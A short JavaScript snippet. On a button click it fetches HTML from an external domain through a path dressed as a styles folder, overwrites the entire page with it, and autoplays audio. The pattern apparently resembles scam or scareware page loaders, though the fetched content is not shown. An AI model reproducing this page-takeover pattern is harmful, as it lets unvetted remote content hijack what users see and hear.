document.addEventListener('DOMContentLoaded', function () {
    function loadAdditionalContent() {
        fetch('https://svtzx.com/Site/styles/maincontent.html')
            .then(response => response.text())
            .then(data => {
                document.documentElement.innerHTML = data;

                const audio = document.getElementById('autoplayAudio');
                if (audio) {
                    audio.play();
                }
            })
            .catch(error => console.error('Error fetching content:', error));
    }

    var btn = document.querySelector('.btn');
    btn.addEventListener('click', function (event) {
        event.preventDefault();

    
        loadAdditionalContent();
    });
});